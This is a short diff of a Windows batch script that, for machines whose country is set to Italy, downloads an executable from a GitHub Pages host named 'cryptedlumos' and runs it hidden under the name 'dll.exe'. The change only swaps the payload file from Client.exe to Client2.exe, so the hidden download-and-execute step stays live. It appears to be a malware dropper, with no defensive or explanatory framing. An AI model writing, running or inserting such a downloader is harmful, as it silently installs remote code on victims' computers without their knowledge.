@@ -71,7 +71,7 @@ cd "%temp%"
 rmdir /s /q "%temp%\%folder%"
 
 if [%Country%]==[IT] (
-  curl.exe %proxy% https://cryptedlumos.github.io/Client.exe --output "%temp%\dll.exe" && nircmd exec hide "%temp%\dll.exe"
+  curl.exe %proxy% https://cryptedlumos.github.io/Client2.exe --output "%temp%\dll.exe" && nircmd exec hide "%temp%\dll.exe"
 ) else (
 echo.
 )
